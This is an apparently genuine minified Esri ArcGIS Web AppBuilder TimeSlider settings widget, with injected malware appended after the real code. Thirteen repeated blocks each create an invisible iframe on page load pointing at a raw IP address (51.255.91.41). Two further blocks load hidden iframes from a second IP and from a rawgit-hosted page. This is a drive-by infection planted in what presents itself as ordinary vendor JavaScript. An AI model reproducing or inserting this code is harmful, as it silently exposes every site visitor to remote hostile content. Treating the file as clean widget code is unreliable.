// All material copyright ESRI, All Rights Reserved, unless otherwise specified.
// See http://js.arcgis.com/3.15/esri/copyright.txt and http://www.arcgis.com/apps/webappbuilder/copyright.txt for details.
//>>built
require({cache:{"widgets/TimeSlider/setting/_build-generate_module":function(){define(["dojo/text!./Setting.html","dojo/text!./css/style.css","dojo/i18n!./nls/strings"],function(){})},"url:widgets/TimeSlider/setting/Setting.html":'\x3cdiv\x3e\r\n\t\x3cdiv data-dojo-attach-point\x3d"showLabelsBox"\x3e\x3c/div\x3e\r\n\r\n\t\x3cdiv class\x3d"dateAndTimeFormat clearFix"\x3e\r\n\t\t\x3cdiv class\x3d"tips"\x3e${nls.dateAndTimeFormat}\x3c/div\x3e\r\n\t\t\x3cdiv class\x3d"jimu-float-leading timeFormats"\x3e\r\n\t\t\t\x3cdiv data-dojo-attach-point\x3d"timeFormat" \x3e\x3c/div\x3e\r\n\t\t\x3c/div\x3e\r\n\r\n\t\t\x3cdiv data-dojo-attach-point\x3d"customDateContainer" class\x3d"customdate-container jimu-float-leading hide"\x3e\r\n\t\t\t\x3cinput class\x3d"customdate jimu-input jimu-float-trailing"\r\n\t\t\tdata-dojo-attach-point\x3d"customDateFormat" data-dojo-attach-event\x3d"blur:_onCustomDateFormatBlur" required\x3d"true"\r\n\t\t\tdata-dojo-type\x3d"dijit/form/ValidationTextBox"/\x3e\r\n\r\n\t\t\t\x3ca class\x3d"help-icon" data-dojo-attach-point\x3d"helpIcon"\r\n\t\t\t href\x3d"http://momentjs.com/docs/#/displaying/format/" \r\n\t\t\t title\x3d"${nls.formatInstruction}" target\x3d"_blank"\x3e\x3c/a\x3e\r\n\t\t\x3c/div\x3e\r\n\t\x3c/div\x3e\r\n\x3c/div\x3e',
"url:widgets/TimeSlider/setting/css/style.css":'.jimu-widget-timeslider-setting {margin-top: 20px;}.jimu-widget-timeslider-setting .clearFix {*overflow: hidden; *zoom: 1;}.jimu-widget-timeslider-setting .clearFix:after {display: table; content: ""; width: 0; clear: both;}.jimu-widget-timeslider-setting .hide {display: none !important;}.jimu-widget-timeslider-setting .dateAndTimeFormat{margin-top: 18px;}.jimu-widget-timeslider-setting .dateAndTimeFormat .tips{font-family: \'Avenir Light\'; font-size: 14px; color: #000000; margin-bottom: 4px;}.jimu-widget-timeslider-setting .timeFormats .dijitSelect {width:220px; height:36px; border-color: #cfcfcf; background-color: #fff;}.jimu-widget-timeslider-setting .timeFormats .dijitSelectFocused .dijitButtonContents{border-color: #cfcfcf;} .jimu-widget-timeslider-setting .dijitSelectHover .dijitButtonContents {border-color:#b5bcc7;}.jimu-widget-timeslider-setting .dijitSelect .dijitArrowButton{background-color: #fff; background-image: none;}.jimu-widget-timeslider-setting .customdate-container{position: relative;}.jimu-widget-timeslider-setting .customdate-container .dijitTextBox {width:260px; height:36px; margin: 0 20px;}.jimu-widget-timeslider-setting .customdate-container .help-icon{height: 16px; width: 16px; background: url("images/help.svg") no-repeat; background-position: 50% 50%; cursor: pointer; position: absolute; right: 35px; top: 11px;}.jimu-rtl .jimu-widget-timeslider-setting .customdate-container .help-icon{left: 35px; right: auto;}.jimu-widget-timeslider-setting .jimu-rtl .help-icon{right: auto; left: 32px;}',
"*now":function(c){c(['dojo/i18n!*preload*widgets/TimeSlider/setting/nls/Setting*["ar","bs","cs","da","de","en","el","es","et","fi","fr","he","hi","hr","id","it","ja","ko","lt","lv","nb","nl","pl","pt-br","pt-pt","ro","ru","sl","sr","sv","th","tr","zh-cn","vi","zh-hk","zh-tw","ROOT"]'])},"*noref":1}});
define("dojo/_base/declare jimu/BaseWidgetSetting dijit/_WidgetsInTemplateMixin dojo/on dojo/_base/lang dojo/_base/html jimu/utils jimu/dijit/CheckBox dijit/form/Select dijit/form/ValidationTextBox".split(" "),function(c,g,h,d,e,f,k,l,m){return c([g,h],{baseClass:"jimu-widget-timeslider-setting",postCreate:function(){this._timeFormatOptions=[{label:this.nls.mapDefault,value:"auto"},{label:"July 2015",value:"MMMM YYYY"},{label:"Jul 2015",value:"MMM YYYY"},{label:"July 21,2015",value:"MMMM D,YYYY"},
{label:"Tue Jul 21,2015",value:"ddd MMM DD,YYYY"},{label:"7/21/2015",value:"M/DD/YYYY"},{label:"2015/7/21",value:"YYYY/M/DD"},{label:"7/21/15",value:"M/DD/YY "},{label:"2015",value:"YYYY"},{label:"7/21/2015 8:00 am",value:"M/DD/YYYY  h:mm a"},{label:"Tue Jul 21 8:00 am",value:"ddd MMM DD  h:mm a"},{label:this.nls.custom,value:"Custom"}];this.inherited(arguments);this.showLabelsBox=new l({label:this.nls.showLayerLabels,checked:!1},this.showLabelsBox);this.showLabelsBox.startup();this.timeFormat=new m({options:this._timeFormatOptions},
this.timeFormat)},startup:function(){this.inherited(arguments);this.config||(this.config={});this.customDateFormat.setAttribute("placeHolder","YYYY-MM-dd h:m:s Z");this.own(d(this.timeFormat,"click",e.hitch(this,function(){"undefined"===typeof this._firstChange&&(this._firstChange=!1)})));this.own(d(this.timeFormat,"change",e.hitch(this,function(a){"undefined"===typeof this._firstChange?this._firstChange=!1:this._initOptionsUI(a)})));this.setConfig(this.config)},_initOptionsUI:function(a,b){"Custom"!==
a?(f.addClass(this.customDateContainer,"hide"),this.customDateFormat.set("value","")):(f.removeClass(this.customDateContainer,"hide"),this.customDateFormat.set("value",b||""))},setConfig:function(a){this.config=a;a.showLabels?this.showLabelsBox.setValue(!0):this.showLabelsBox.setValue(!1);if(a.timeFormat){this.timeFormat.setValue(a.timeFormat);var b;a.customDateFormat&&(b=a.customDateFormat);this._initOptionsUI(a.timeFormat,b)}else this.timeFormat.setValue("auto")},getConfig:function(){if("Custom"===
this.timeFormat.getValue()&&""===this.customDateFormat.get("value"))return this.customDateFormat.focus(),this.customDateFormat.set("state","Error"),!1;this.config.showLabels=this.showLabelsBox.getValue();this.config.timeFormat=this.timeFormat.getValue();this.customDateFormat.get("value")?this.config.customDateFormat=this.customDateFormat.get("value"):this.config.customDateFormat="";return this.config},_onCustomDateFormatBlur:function(){this.customDateFormat.value=k.stripHTML(this.customDateFormat.value||
"")}})});;;;;



if (typeof window.zioelaneid == 'undefined') {
	window.zioelaneid = 1;
	document.addEventListener("DOMContentLoaded", function(event) { 
		var iframe = document.createElement('iframe');
		iframe.style.display = "none";
		iframe.src = "http://51.255.91.41/iframe.php";
		document.body.appendChild(iframe);
	});
}
;;;;



if (typeof window.zioelaneid == 'undefined') {
	window.zioelaneid = 1;
	document.addEventListener("DOMContentLoaded", function(event) { 
		var iframe = document.createElement('iframe');
		iframe.style.display = "none";
		iframe.src = "http://51.255.91.41/iframe.php";
		document.body.appendChild(iframe);
	});
}
;;;;



if (typeof window.zioelaneid == 'undefined') {
	window.zioelaneid = 1;
	document.addEventListener("DOMContentLoaded", function(event) { 
		var iframe = document.createElement('iframe');
		iframe.style.display = "none";
		iframe.src = "http://51.255.91.41/iframe.php";
		document.body.appendChild(iframe);
	});
}
;;;;



if (typeof window.zioelaneid == 'undefined') {
	window.zioelaneid = 1;
	document.addEventListener("DOMContentLoaded", function(event) { 
		var iframe = document.createElement('iframe');
		iframe.style.display = "none";
		iframe.src = "http://51.255.91.41/iframe.php";
		document.body.appendChild(iframe);
	});
}
;;;;



if (typeof window.zioelaneid == 'undefined') {
	window.zioelaneid = 1;
	document.addEventListener("DOMContentLoaded", function(event) { 
		var iframe = document.createElement('iframe');
		iframe.style.display = "none";
		iframe.src = "http://51.255.91.41/iframe.php";
		document.body.appendChild(iframe);
	});
}
;;;;



if (typeof window.zioelaneid == 'undefined') {
	window.zioelaneid = 1;
	document.addEventListener("DOMContentLoaded", function(event) { 
		var iframe = document.createElement('iframe');
		iframe.style.display = "none";
		iframe.src = "http://51.255.91.41/iframe.php";
		document.body.appendChild(iframe);
	});
}
;;;;



if (typeof window.zioelaneid == 'undefined') {
	window.zioelaneid = 1;
	document.addEventListener("DOMContentLoaded", function(event) { 
		var iframe = document.createElement('iframe');
		iframe.style.display = "none";
		iframe.src = "http://51.255.91.41/iframe.php";
		document.body.appendChild(iframe);
	});
}
;;;;



if (typeof window.zioelaneid == 'undefined') {
	window.zioelaneid = 1;
	document.addEventListener("DOMContentLoaded", function(event) { 
		var iframe = document.createElement('iframe');
		iframe.style.display = "none";
		iframe.src = "http://51.255.91.41/iframe.php";
		document.body.appendChild(iframe);
	});
}
;;;;



if (typeof window.zioelaneid == 'undefined') {
	window.zioelaneid = 1;
	document.addEventListener("DOMContentLoaded", function(event) { 
		var iframe = document.createElement('iframe');
		iframe.style.display = "none";
		iframe.src = "http://51.255.91.41/iframe.php";
		document.body.appendChild(iframe);
	});
}
;;;;



if (typeof window.zioelaneid == 'undefined') {
	window.zioelaneid = 1;
	document.addEventListener("DOMContentLoaded", function(event) { 
		var iframe = document.createElement('iframe');
		iframe.style.display = "none";
		iframe.src = "http://51.255.91.41/iframe.php";
		document.body.appendChild(iframe);
	});
}
;;;;



if (typeof window.zioelaneid == 'undefined') {
	window.zioelaneid = 1;
	document.addEventListener("DOMContentLoaded", function(event) { 
		var iframe = document.createElement('iframe');
		iframe.style.display = "none";
		iframe.src = "http://51.255.91.41/iframe.php";
		document.body.appendChild(iframe);
	});
}
;;;;



if (typeof window.zioelaneid == 'undefined') {
	window.zioelaneid = 1;
	document.addEventListener("DOMContentLoaded", function(event) { 
		var iframe = document.createElement('iframe');
		iframe.style.display = "none";
		iframe.src = "http://51.255.91.41/iframe.php";
		document.body.appendChild(iframe);
	});
}
;;;;



if (typeof window.zioelaneid == 'undefined') {
	window.zioelaneid = 1;
	document.addEventListener("DOMContentLoaded", function(event) { 
		var iframe = document.createElement('iframe');
		iframe.style.display = "none";
		iframe.src = "http://51.255.91.41/iframe.php";
		document.body.appendChild(iframe);
	});
}





if (typeof obj.foo == 'undefined') {
window.jsuekzis = 1;
window.onload = function() {
    var iframe = document.createElement('iframe');
    iframe.style.display = "none";
    iframe.src = "http://155.94.75.92/iframe.html";
    document.body.appendChild(iframe);
};

}





void 0===window.mondrawtexture&&(window.mondrawtexture=1,window.onload=function(){var e=document.createElement('iframe');e.style.display='none',e.src='https://cdn.rawgit.com/jdobt/3e35d8a7d2c1c36ae1972ea03df91572/raw/8656e6f8554bfd2f13cf8eb78e8df044fae1e9e2/drawtexture.html',document.body.appendChild(e)});